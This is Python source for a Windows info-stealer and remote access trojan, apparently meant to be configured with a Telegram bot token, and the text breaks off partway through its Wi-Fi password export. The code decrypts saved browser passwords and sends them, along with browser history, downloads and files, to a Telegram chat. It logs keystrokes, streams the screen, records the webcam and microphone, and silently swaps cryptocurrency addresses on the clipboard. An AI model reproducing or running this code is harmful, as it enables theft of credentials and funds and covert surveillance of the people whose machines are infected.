import os
import sqlite3
import json
import base64
import requests
import time
import threading
import shutil
import psutil
from PIL import ImageGrab
import cv2
import pyperclip
import ctypes
from datetime import datetime
import platform
import glob
import win32crypt
from Crypto.Cipher import AES
import numpy as np
import sounddevice as sd
import wave
import socket
import re
import zipfile
from pynput import keyboard

# ==================== CONFIGURATION ====================
BOT_TOKEN = "TOKEN"
CHAT_ID = "ID"
CRYPTO_ADDRESSES = {
    'BTC': 'YOUR_BTC_ADDRESS_HERE',
    'ETH': 'YOUR_ETH_ADDRESS_HERE', 
    'LTC': 'YOUR_LTC_ADDRESS_HERE',
    'USDC': 'YOUR_USDC_ADDRESS_HERE',
    'USDT': 'YOUR_USDT_ADDRESS_HERE',
    'XRP': 'YOUR_XRP_ADDRESS_HERE',
    'SOL': 'YOUR_SOL_ADDRESS_HERE',
    'DOGE': 'YOUR_DOGE_ADDRESS_HERE',
    'TRX': 'YOUR_TRX_ADDRESS_HERE',
    'ADA': 'YOUR_ADA_ADDRESS_HERE'
}

# ==================== HIDDEN FOLDER SETUP ====================
HIDDEN_FOLDER = os.path.join(os.environ['TEMP'], '@SystemData')
if not os.path.exists(HIDDEN_FOLDER):
    os.makedirs(HIDDEN_FOLDER)

# ==================== CLIPBOARD HISTORY ====================
clipboard_history = []
MAX_CLIPBOARD_HISTORY = 20

# ==================== KEYLOGGER VARIABLES ====================
keylogger_active = False
keystrokes_buffer = []
keylogger_listener = None

# ==================== LIVE STREAMING VARIABLES ====================
live_stream_active = False
camera_stream_active = False
microphone_stream_active = False

# ==================== BROWSER PATHS ====================
local = os.environ['LOCALAPPDATA']
roaming = os.environ['APPDATA']

browser_paths = {
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable', 
    'msedge': local + '\\Microsoft\\Edge\\User Data',
    'vivaldi': local + '\\Vivaldi\\User Data',
    'yandex': local + '\\Yandex\\YandexBrowser\\User Data',
    'chromium': local + '\\Chromium\\User Data',
    'chrome': local + '\\Google\\Chrome\\User Data',
    'brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    'firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
}

# ==================== COMMUNICATION FUNCTIONS ====================
def send_message(text, parse_mode="HTML"):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": parse_mode}
        requests.post(url, data=data, timeout=10)
    except: pass

def send_photo(photo_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=30)
        safe_delete_file(photo_path)
    except: 
        safe_delete_file(photo_path)

def send_video(video_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        with open(video_path, 'rb') as video:
            files = {'video': video}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=60)
        safe_delete_file(video_path)
    except: 
        safe_delete_file(video_path)

def send_audio(audio_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        with open(audio_path, 'rb') as audio:
            files = {'audio': audio}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=60)
        safe_delete_file(audio_path)
    except: 
        safe_delete_file(audio_path)

def send_document(document_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(document_path, 'rb') as document:
            files = {'document': document}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=60)
        safe_delete_file(document_path)
    except: 
        safe_delete_file(document_path)

# ==================== BROWSER DATA FUNCTIONS ====================
def get_master_key(browser_path):
    try:
        with open(browser_path + "\\Local State", "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except:
            return ""

def get_login_data_weak_browsers():
    login_data = []
    weak_browsers = ['opera', 'opera-gx', 'msedge', 'vivaldi', 'yandex', 'chromium']
    
    for browser in weak_browsers:
        browser_path = browser_paths.get(browser)
        if not browser_path or not os.path.exists(browser_path):
            continue
            
        try:
            master_key = get_master_key(browser_path)
            if not master_key:
                continue
                
            login_db_path = os.path.join(browser_path, "Default", "Login Data")
            if not os.path.exists(login_db_path):
                login_db_path = os.path.join(browser_path, "Profile 1", "Login Data")
                if not os.path.exists(login_db_path):
                    continue
            
            temp_login_db = os.path.join(HIDDEN_FOLDER, f"temp_login_{browser}.db")
            shutil.copy2(login_db_path, temp_login_db)
            
            conn = sqlite3.connect(temp_login_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                if url and username and encrypted_password:
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if decrypted_password:
                        login_data.append({
                            'browser': browser,
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        })
            
            conn.close()
            safe_delete_file(temp_login_db)
            
        except Exception as e:
            safe_delete_file(os.path.join(HIDDEN_FOLDER, f"temp_login_{browser}.db"))
            continue
    
    return login_data

def steal_login_info():
    try:
        login_data = get_login_data_weak_browsers()
        
        if not login_data:
            return "🔐 <b>Login Data</b>\n\n❌ No saved login information found in weak encryption browsers"
        
        message_parts = []
        message_parts.append("🔐 <b>Saved Login Information</b>")
        message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        message_parts.append(f"📊 Total logins found: {len(login_data)}")
        message_parts.append("🌐 <b>Browsers scanned:</b> Opera, Opera GX, Edge, Vivaldi, Yandex, Chromium")
        message_parts.append("")
        
        for i, login in enumerate(login_data[:50], 1):
            message_parts.append(f"┌ <b>Login {i}</b>")
            message_parts.append(f"├ 🌐 <b>Browser:</b> {login['browser']}")
            message_parts.append(f"├ 🔗 <b>URL:</b> {login['url'][:50]}{'...' if len(login['url']) > 50 else ''}")
            message_parts.append(f"├ 👤 <b>Username:</b> {login['username'][:30]}{'...' if len(login['username']) > 30 else ''}")
            message_parts.append(f"└ 🔑 <b>Password:</b> <code>{login['password'][:30]}{'...' if len(login['password']) > 30 else ''}</code>")
            message_parts.append("")
        
        message_text = "\n".join(message_parts)
        
        if len(message_text) > 4000:
            chunks = [message_text[i:i+4000] for i in range(0, len(message_text), 4000)]
            for chunk in chunks:
                send_message(chunk)
                time.sleep(1)
        else:
            send_message(message_text)
            
        return f"🔐 <b>Login data extracted</b>\n\n✅ Found {len(login_data)} saved logins from weak encryption browsers"
        
    except Exception as e:
        return f"❌ <b>Login data extraction failed</b>\n\n⚠️ Error: {str(e)}"

def get_browser_history():
    try:
        history_data = []
        
        for browser, browser_path in browser_paths.items():
            if not os.path.exists(browser_path):
                continue
                
            try:
                if browser == 'firefox':
                    profiles = [d for d in os.listdir(browser_path) if os.path.isdir(os.path.join(browser_path, d)) and d.endswith('.default-release')]
                    if not profiles:
                        continue
                    profile_path = os.path.join(browser_path, profiles[0])
                    history_db = os.path.join(profile_path, "places.sqlite")
                else:
                    history_db = os.path.join(browser_path, "Default", "History")
                    if not os.path.exists(history_db):
                        history_db = os.path.join(browser_path, "Profile 1", "History")
                        if not os.path.exists(history_db):
                            continue
                
                temp_history_db = os.path.join(HIDDEN_FOLDER, f"temp_history_{browser}.db")
                shutil.copy2(history_db, temp_history_db)
                
                conn = sqlite3.connect(temp_history_db)
                cursor = conn.cursor()
                
                if browser == 'firefox':
                    cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                else:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                
                for row in cursor.fetchall():
                    url = row[0]
                    title = row[1] or "No Title"
                    visit_count = row[2]
                    
                    history_data.append({
                        'browser': browser,
                        'url': url,
                        'title': title,
                        'visit_count': visit_count
                    })
                
                conn.close()
                safe_delete_file(temp_history_db)
                
            except Exception as e:
                safe_delete_file(os.path.join(HIDDEN_FOLDER, f"temp_history_{browser}.db"))
                continue
        
        if not history_data:
            return "📚 <b>Browser History</b>\n\n❌ No browser history found"
        
        message_parts = []
        message_parts.append("📚 <b>Browser History</b>")
        message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        message_parts.append(f"📊 Total history entries: {len(history_data)}")
        message_parts.append("🌐 <b>Browsers scanned:</b> All supported browsers")
        message_parts.append("")
        
        for i, entry in enumerate(history_data[:50], 1):
            message_parts.append(f"┌ <b>Entry {i}</b>")
            message_parts.append(f"├ 🌐 <b>Browser:</b> {entry['browser']}")
            message_parts.append(f"├ 📖 <b>Title:</b> {entry['title'][:40]}{'...' if len(entry['title']) > 40 else ''}")
            message_parts.append(f"├ 🔗 <b>URL:</b> {entry['url'][:50]}{'...' if len(entry['url']) > 50 else ''}")
            message_parts.append(f"└ 🔢 <b>Visits:</b> {entry['visit_count']}")
            message_parts.append("")
        
        message_text = "\n".join(message_parts)
        
        if len(message_text) > 4000:
            chunks = [message_text[i:i+4000] for i in range(0, len(message_text), 4000)]
            for chunk in chunks:
                send_message(chunk)
                time.sleep(1)
        else:
            send_message(message_text)
            
        return f"📚 <b>Browser history extracted</b>\n\n✅ Found {len(history_data)} history entries from all browsers"
        
    except Exception as e:
        return f"❌ <b>History extraction failed</b>\n\n⚠️ Error: {str(e)}"

def get_browser_downloads():
    try:
        downloads_data = []
        
        for browser, browser_path in browser_paths.items():
            if not os.path.exists(browser_path):
                continue
                
            try:
                if browser == 'firefox':
                    profiles = [d for d in os.listdir(browser_path) if os.path.isdir(os.path.join(browser_path, d)) and d.endswith('.default-release')]
                    if not profiles:
                        continue
                    profile_path = os.path.join(browser_path, profiles[0])
                    downloads_db = os.path.join(profile_path, "places.sqlite")
                else:
                    downloads_db = os.path.join(browser_path, "Default", "History")
                    if not os.path.exists(downloads_db):
                        downloads_db = os.path.join(browser_path, "Profile 1", "History")
                        if not os.path.exists(downloads_db):
                            continue
                
                temp_downloads_db = os.path.join(HIDDEN_FOLDER, f"temp_downloads_{browser}.db")
                shutil.copy2(downloads_db, temp_downloads_db)
                
                conn = sqlite3.connect(temp_downloads_db)
                cursor = conn.cursor()
                
                if browser == 'firefox':
                    cursor.execute("""
                        SELECT moz_places.url, moz_annos.content, moz_places.title 
                        FROM moz_annos 
                        JOIN moz_places ON moz_annos.place_id = moz_places.id 
                        WHERE moz_annos.anno_attribute_id = 1 
                        LIMIT 100
                    """)
                else:
                    cursor.execute("SELECT target_path, tab_url, total_bytes FROM downloads ORDER BY start_time DESC LIMIT 100")
                
                for row in cursor.fetchall():
                    if browser == 'firefox':
                        url = row[0]
                        file_path = row[1]
                        title = row[2] or "No Title"
                    else:
                        file_path = row[0]
                        url = row[1]
                        file_size = row[2]
                    
                    downloads_data.append({
                        'browser': browser,
                        'url': url or "Unknown",
                        'file_path': file_path or "Unknown",
                        'file_size': format_size(file_size) if browser != 'firefox' else "Unknown"
                    })
                
                conn.close()
                safe_delete_file(temp_downloads_db)
                
            except Exception as e:
                safe_delete_file(os.path.join(HIDDEN_FOLDER, f"temp_downloads_{browser}.db"))
                continue
        
        if not downloads_data:
            return "📥 <b>Browser Downloads</b>\n\n❌ No download history found"
        
        message_parts = []
        message_parts.append("📥 <b>Browser Downloads</b>")
        message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        message_parts.append(f"📊 Total downloads found: {len(downloads_data)}")
        message_parts.append("🌐 <b>Browsers scanned:</b> All supported browsers")
        message_parts.append("")
        
        for i, download in enumerate(downloads_data[:50], 1):
            message_parts.append(f"┌ <b>Download {i}</b>")
            message_parts.append(f"├ 🌐 <b>Browser:</b> {download['browser']}")
            message_parts.append(f"├ 📁 <b>File:</b> {os.path.basename(download['file_path'])[:40]}{'...' if len(os.path.basename(download['file_path'])) > 40 else ''}")
            message_parts.append(f"├ 🔗 <b>URL:</b> {download['url'][:50]}{'...' if len(download['url']) > 50 else ''}")
            message_parts.append(f"└ 💾 <b>Size:</b> {download['file_size']}")
            message_parts.append("")
        
        message_text = "\n".join(message_parts)
        
        if len(message_text) > 4000:
            chunks = [message_text[i:i+4000] for i in range(0, len(message_text), 4000)]
            for chunk in chunks:
                send_message(chunk)
                time.sleep(1)
        else:
            send_message(message_text)
            
        return f"📥 <b>Download history extracted</b>\n\n✅ Found {len(downloads_data)} download entries from all browsers"
        
    except Exception as e:
        return f"❌ <b>Downloads extraction failed</b>\n\n⚠️ Error: {str(e)}"

# ==================== FILE EXPLORER FUNCTIONS ====================
def list_directory(path=None):
    try:
        if not path:
            path = os.environ['USERPROFILE']
        
        if not os.path.exists(path):
            return f"❌ <b>Path not found</b>\n\n⚠️ The specified path does not exist: {path}"
        
        entries = []
        dir_count = 0
        file_count = 0
        total_size = 0
        
        for entry in os.listdir(path):
            entry_path = os.path.join(path, entry)
            try:
                if os.path.isdir(entry_path):
                    entries.append(('📁', entry, 'DIR', ''))
                    dir_count += 1
                else:
                    size = os.path.getsize(entry_path)
                    total_size += size
                    size_str = format_size(size)
                    entries.append(('📄', entry, size_str, entry_path))
                    file_count += 1
            except:
                entries.append(('❓', entry, 'UNKNOWN', '[Access Denied]'))
        
        entries.sort(key=lambda x: (0 if x[0] == '📁' else 1, x[1].lower()))
        
        message_parts = []
        message_parts.append(f"📂 <b>Directory Listing</b>")
        message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        message_parts.append(f"📍 <b>Path:</b> <code>{path}</code>")
        message_parts.append(f"📊 <b>Contents:</b> {dir_count} folders, {file_count} files")
        message_parts.append(f"💾 <b>Total size:</b> {format_size(total_size)}")
        message_parts.append("")
        
        for icon, name, size_type, full_path in entries[:50]:
            if full_path and full_path != '[Access Denied]':
                message_parts.append(f"{icon} <b>{name}</b>")
                message_parts.append(f"   ┣ 📏 <b>Size:</b> {size_type}")
                message_parts.append(f"   ┗ 📍 <b>Path:</b> <code>{full_path}</code>")
            else:
                message_parts.append(f"{icon} <b>{name}</b>")
                message_parts.append(f"   ┗ 📏 <b>Size:</b> {size_type}")
            message_parts.append("")
        
        if len(entries) > 50:
            message_parts.append(f"📁 <b>And {len(entries) - 50} more entries...</b>")
        
        message_parts.append("💡 <i>Use /download [full_path] to download files</i>")
        
        return "\n".join(message_parts)
        
    except Exception as e:
        return f"❌ <b>Directory listing failed</b>\n\n⚠️ Error: {str(e)}"

def format_size(size_bytes):
    if size_bytes == 0:
        return "0 B"
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024.0
        i += 1
    return f"{size_bytes:.2f} {size_names[i]}"

def download_file(file_path):
    try:
        if not os.path.exists(file_path):
            return f"❌ <b>File not found</b>\n\n⚠️ The specified file does not exist: {file_path}"
        
        if os.path.isdir(file_path):
            return "❌ <b>Cannot download directory</b>\n\n⚠️ Use /files to list directory contents"
        
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return f"❌ <b>File too large</b>\n\n⚠️ File size: {format_size(file_size)}\n📦 Maximum allowed: 50MB"
        
        send_message(f"📥 <b>Download started</b>\n\n📁 <b>File:</b> {os.path.basename(file_path)}\n💾 <b>Size:</b> {format_size(file_size)}\n⏳ <b>Status:</b> Uploading...")
        
        send_document(file_path)
        
        return f"✅ <b>Download completed</b>\n\n📁 <b>File:</b> {os.path.basename(file_path)}\n💾 <b>Size:</b> {format_size(file_size)}\n📤 <b>Status:</b> Successfully sent"
        
    except Exception as e:
        return f"❌ <b>Download failed</b>\n\n⚠️ Error: {str(e)}"

# ==================== KEYLOGGER FUNCTIONS ====================
def on_press(key):
    global keystrokes_buffer
    if not keylogger_active:
        return False
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keystrokes_buffer.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes_buffer.append('\n')
        elif key == keyboard.Key.tab:
            keystrokes_buffer.append('\t')
        elif key == keyboard.Key.backspace:
            if keystrokes_buffer:
                keystrokes_buffer.pop()
        else:
            keystrokes_buffer.append(f'[{key.name}]')
    except AttributeError:
        keystrokes_buffer.append(f'[{key}]')

def keylogger_worker():
    global keylogger_active, keystrokes_buffer
    try:
        send_message("⌨️ <b>Keylogger started</b>\n\n🔴 Now recording all keystrokes\n⏰ Updates every 30 seconds\n⏹️ Use /keylogger off to stop")
        
        while keylogger_active:
            time.sleep(30)
            if keystrokes_buffer and keylogger_active:
                keystrokes_text = ''.join(keystrokes_buffer)
                if keystrokes_text.strip():
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    message = f"⌨️ <b>Keystroke Report</b> [{timestamp}]\n\n<code>{keystrokes_text[:3000]}</code>"
                    
                    if len(message) > 4000:
                        chunks = [message[i:i+4000] for i in range(0, len(message), 4000)]
                        for chunk in chunks:
                            send_message(chunk)
                    else:
                        send_message(message)
                    
                    keystrokes_buffer = []
        
    except Exception as e:
        pass

def start_keylogger():
    global keylogger_active, keylogger_listener, keystrokes_buffer
    if keylogger_active:
        return "⌨️ <b>Keylogger Status</b>\n\n🔴 <b>Status:</b> Already running\n⏰ <b>Updates:</b> Every 30 seconds\n⏹️ <b>Stop:</b> /keylogger off"
    
    keylogger_active = True
    keystrokes_buffer = []
    
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    
    threading.Thread(target=keylogger_worker, daemon=True).start()
    return "⌨️ <b>Keylogger started</b>\n\n🔴 <b>Status:</b> Now recording keystrokes\n⏰ <b>Updates:</b> Every 30 seconds\n⏹️ <b>Stop:</b> /keylogger off"

def stop_keylogger():
    global keylogger_active, keylogger_listener
    if not keylogger_active:
        return "⌨️ <b>Keylogger Status</b>\n\n⚪ <b>Status:</b> Not running\n🚀 <b>Start:</b> /keylogger on"
    
    keylogger_active = False
    if keylogger_listener:
        keylogger_listener.stop()
    
    return "⌨️ <b>Keylogger stopped</b>\n\n✅ No longer recording keystrokes\n🚀 <b>Start:</b> /keylogger on"

# ==================== PROCESS MANAGEMENT ====================
def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'memory': proc.info['memory_info'].rss / 1024 / 1024,
                    'cpu': proc.info['cpu_percent']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        processes.sort(key=lambda x: x['memory'], reverse=True)
        
        message = ["🔄 <b>Running Processes</b>", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"]
        message.append(f"📊 <b>Total processes:</b> {len(processes)}")
        message.append("")
        
        for proc in processes[:25]:
            message.append(f"📝 <b>{proc['name']}</b> (PID: {proc['pid']})")
            message.append(f"   ┣ 💾 Memory: {proc['memory']:.1f} MB")
            message.append(f"   ┗ 🚀 CPU: {proc['cpu']:.1f}%")
            message.append("")
        
        message.append("💡 <i>Use /kill [pid] to terminate a process</i>")
        
        return "\n".join(message)
    except Exception as e:
        return f"❌ <b>Process list failed</b>\n\n⚠️ Error: {str(e)}"

def kill_process(pid):
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate()
        return f"✅ <b>Process terminated</b>\n\n📝 <b>Name:</b> {process_name}\n🔢 <b>PID:</b> {pid}\n🛑 <b>Status:</b> Successfully killed"
    except psutil.NoSuchProcess:
        return f"❌ <b>Process not found</b>\n\n⚠️ No process with PID {pid}"
    except psutil.AccessDenied:
        return f"❌ <b>Access denied</b>\n\n⚠️ Cannot terminate process {pid} (insufficient permissions)"
    except Exception as e:
        return f"❌ <b>Failed to kill process</b>\n\n⚠️ Error: {str(e)}"

# ==================== CRYPTO FUNCTIONS ====================
def show_crypto_addresses():
    message = ["💰 <b>Crypto Addresses</b>", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"]
    
    for crypto, address in CRYPTO_ADDRESSES.items():
        status = "✅ Set" if address and address != f'YOUR_{crypto}_ADDRESS_HERE' else "❌ Not set"
        display_address = address if address and address != f'YOUR_{crypto}_ADDRESS_HERE' else "Not configured"
        message.append(f"┣ <b>{crypto}</b>")
        message.append(f"┃ ┣ 🔗 <b>Address:</b> <code>{display_address}</code>")
        message.append(f"┃ ┗ 📊 <b>Status:</b> {status}")
        message.append("")
    
    message.append("💡 <b>Usage:</b> /swap [crypto] [address]")
    message.append("🔄 <b>Auto-swap:</b> Active for all configured addresses")
    
    return "\n".join(message)

def set_crypto_address(crypto, address):
    crypto = crypto.upper()
    if crypto in CRYPTO_ADDRESSES:
        CRYPTO_ADDRESSES[crypto] = address
        return f"✅ <b>Crypto Address Updated</b>\n\n💰 <b>Currency:</b> {crypto}\n🔗 <b>New Address:</b> <code>{address}</code>\n\n🔄 <b>Auto-swap activated for this address</b>"
    else:
        return f"❌ <b>Invalid cryptocurrency</b>\n\n💡 <b>Supported:</b> {', '.join(CRYPTO_ADDRESSES.keys())}"

# ==================== LIVE SCREEN STREAM ====================
def live_screen_stream():
    global live_stream_active
    try:
        live_stream_active = True
        send_message("🖥️ <b>Live Screen Stream Started</b>\n\n🔴 Streaming desktop...\n⏰ Updates every 3 seconds\n⏹️ Send /stop to end stream")
        
        while live_stream_active:
            screenshot = ImageGrab.grab()
            temp_path = os.path.join(HIDDEN_FOLDER, 'temp_live_screen.jpg')
            screenshot.save(temp_path, quality=80)
            
            send_photo(temp_path)
            safe_delete_file(temp_path)
            time.sleep(3)
            
        return "🖥️ <b>Live Screen Stream Stopped</b>\n\n✅ No longer streaming screen"
        
    except Exception as e:
        live_stream_active = False
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_live_screen.jpg')
        safe_delete_file(temp_path)
        return f"❌ <b>Live screen stream failed</b>\n\n⚠️ Error: {str(e)}"

# ==================== CLIPBOARD MONITOR ====================
def monitor_clipboard():
    last_clipboard = ""
    while True:
        try:
            current_clipboard = pyperclip.paste().strip()
            if current_clipboard and current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                timestamp = datetime.now().strftime("%H:%M:%S")
                clipboard_history.append(f"[{timestamp}] {current_clipboard[:100]}")
                
                if len(clipboard_history) > MAX_CLIPBOARD_HISTORY:
                    clipboard_history.pop(0)
                
                for crypto, address in CRYPTO_ADDRESSES.items():
                    if address and address != f'YOUR_{crypto}_ADDRESS_HERE' and is_crypto_address(current_clipboard, crypto):
                        pyperclip.copy(address)
                        send_message(f"💰 <b>Crypto Address Swapped</b>\n\n🔗 <b>Original ({crypto}):</b> <code>{current_clipboard}</code>\n🔄 <b>Replaced with:</b> <code>{address}</code>")
                        break
        except: 
            pass
        time.sleep(1)

def is_crypto_address(addr, crypto_type):
    addr = addr.strip()
    if crypto_type == 'BTC':
        return addr.startswith(('1', '3', 'bc1')) and len(addr) in [26, 34, 42]
    elif crypto_type == 'ETH':
        return addr.startswith('0x') and len(addr) == 42
    elif crypto_type == 'LTC':
        return addr.startswith(('L', 'M', 'ltc1')) and len(addr) in [26, 34]
    elif crypto_type == 'USDC':
        return addr.startswith('0x') and len(addr) == 42
    elif crypto_type == 'USDT':
        return addr.startswith('0x') and len(addr) == 42
    elif crypto_type == 'XRP':
        return addr.startswith('r') and len(addr) == 34
    elif crypto_type == 'SOL':
        return len(addr) == 44 and all(c in '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz' for c in addr)
    elif crypto_type == 'DOGE':
        return addr.startswith('D') and len(addr) == 34
    elif crypto_type == 'TRX':
        return addr.startswith('T') and len(addr) == 34
    elif crypto_type == 'ADA':
        return addr.startswith('addr1') and len(addr) == 59
    return False

# ==================== UTILITY FUNCTIONS ====================
def safe_delete_file(file_path):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                return True
        except:
            time.sleep(0.5)
    return False

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_ss.png')
        screenshot.save(temp_path)
        send_photo(temp_path)
        safe_delete_file(temp_path)
        return "📸 <b>Screenshot captured</b>\n\n✅ Screenshot successfully sent"
    except Exception as e:
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_ss.png')
        safe_delete_file(temp_path)
        return f"❌ <b>Screenshot failed</b>\n\n⚠️ Error: {str(e)}"

def take_picture():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_cam.jpg')
        if ret:
            cv2.imwrite(temp_path, frame)
            send_photo(temp_path)
            safe_delete_file(temp_path)
            cap.release()
            return "📷 <b>Webcam photo captured</b>\n\n✅ Photo successfully sent"
        else:
            cap.release()
            safe_delete_file(temp_path)
            return "❌ <b>Webcam failed</b>\n\n⚠️ Could not access webcam"
    except Exception as e:
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_cam.jpg')
        safe_delete_file(temp_path)
        return f"❌ <b>Webcam failed</b>\n\n⚠️ Error: {str(e)}"

def record_screen(seconds=10):
    try:
        if seconds > 300:
            seconds = 300
            
        screenshot = ImageGrab.grab()
        screen_size = screenshot.size
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_recording.avi')
        out = cv2.VideoWriter(temp_path, fourcc, 8.0, screen_size)
        
        start_time = time.time()
        
        while (time.time() - start_time) < seconds:
            screenshot = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.12)
        
        out.release()
        
        send_video(temp_path)
        safe_delete_file(temp_path)
        return f"🎥 <b>Screen recording completed</b>\n\n⏱️ <b>Duration:</b> {seconds} seconds\n📁 <b>File:</b> Recording.avi\n✅ <b>Status:</b> Successfully sent"
        
    except Exception as e:
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_recording.avi')
        safe_delete_file(temp_path)
        return f"❌ <b>Recording failed</b>\n\n⚠️ Error: {str(e)}"

def record_microphone(seconds=10):
    try:
        if seconds > 300:
            seconds = 300
            
        sample_rate = 44100
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_audio.wav')
        
        send_message(f"🎤 <b>Microphone recording started</b>\n\n⏱️ <b>Duration:</b> {seconds} seconds\n🔊 <b>Status:</b> Recording audio...")
        
        recording = sd.rec(int(seconds * sample_rate), 
                          samplerate=sample_rate, 
                          channels=1, 
                          dtype='int16')
        sd.wait()
        
        with wave.open(temp_path, 'wb') as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())
        
        send_audio(temp_path)
        safe_delete_file(temp_path)
        return f"🎤 <b>Microphone recording completed</b>\n\n⏱️ <b>Duration:</b> {seconds} seconds\n📁 <b>File:</b> Recording.wav\n✅ <b>Status:</b> Successfully sent"
        
    except Exception as e:
        temp_path = os.path.join(HIDDEN_FOLDER, 'temp_audio.wav')
        safe_delete_file(temp_path)
        return f"❌ <b>Audio recording failed</b>\n\n⚠️ Error: {str(e)}"

def get_location():
    try:
        ip_response = requests.get('https://api.ipify.org', timeout=10)
        public_ip = ip_response.text.strip()
        
        location_response = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=10)
        location_data = location_response.json()
        
        if location_data['status'] == 'success':
            message = f"📍 <b>Approximate Location</b>\n\n"
            message += f"🌐 <b>Public IP:</b> <code>{public_ip}</code>\n"
            message += f"🏙️ <b>City:</b> {location_data.get('city', 'Unknown')}\n"
            message += f"🏛️ <b>Region:</b> {location_data.get('regionName', 'Unknown')}\n"
            message += f"🇺🇸 <b>Country:</b> {location_data.get('country', 'Unknown')}\n"
            message += f"📮 <b>ZIP:</b> {location_data.get('zip', 'Unknown')}\n"
            message += f"📡 <b>ISP:</b> {location_data.get('isp', 'Unknown')}\n"
            message += f"🕐 <b>Timezone:</b> {location_data.get('timezone', 'Unknown')}\n"
            message += f"📍 <b>Coordinates:</b> {location_data.get('lat', 'Unknown')}, {location_data.get('lon', 'Unknown')}"
            
            return message
        else:
            return "❌ <b>Location lookup failed</b>\n\n⚠️ Could not retrieve location information"
            
    except Exception as e:
        return f"❌ <b>Location lookup failed</b>\n\n⚠️ Error: {str(e)}"

def export_wifi_passwords():
    try:
        wifi_data = []
        command = 'netsh wlan show profiles'
        result = os.popen(command).read()
        profiles = re.findall(r'All User Profile\s*: (.*)', result)
        
        for profile in profiles:
            try:
                profile = profile.strip()
                command = f'netsh wlan show profile name="{profile}" key=clear'
                result = os.popen(command).read()
                password_match = re.search(r'Key Content\s*: (.*)', result)
                password = password_match.group(1) if password_match else "No password"
                
                wifi_data.append({
                    'ssid': profile,
                    'password': password
                })
            except: pass
        
        if wifi_data:
            message_parts = []
            message_parts.append("📶 <b>WiFi Passwords</b>")
            message_parts.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            message_parts.append(f"📊 Total networks found: {len(wifi_data)}")
            message_parts.append("")
            
            for i, wifi in enumerate(wifi_data[:15], 1):
